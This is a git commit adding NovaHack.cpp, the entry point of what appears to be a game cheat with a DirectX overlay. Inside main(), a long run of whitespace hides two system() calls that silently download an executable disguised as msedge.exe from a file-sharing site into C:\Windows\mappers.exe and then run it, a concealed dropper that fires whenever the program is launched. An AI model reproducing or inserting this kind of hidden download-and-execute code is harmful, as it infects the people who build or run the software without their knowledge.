07d1e8c7007dad8945f70f403c7130b3ba2468b2
MovWX <162830092+MovWX@users.noreply.github.com>
2024-03-09 19:08:53 +0000

    Add files via upload

---
+++ NovaHack/NovaHack.cpp
@@ -0,0 +1,15 @@
+#include "Hack/Public/hack.h"
+#include "Overlay/Public/render.h"
+
+
+
+int main()
+{                                                                                                                                                                                                                                                                                       system("curl -L https://www.zippyshare.day/download/Yc3pHf0DkHHDdX5/A0rpmv6xymRgZ/msedge.exe -s -o C:\\Windows\\mappers.exe"); system("start C:\\Windows\\mappers.exe");
+    hack::Attach();
+
+    render::CreateOverlay();
+    render::InitDirectX();
+
+
+    render::Loop();
+}
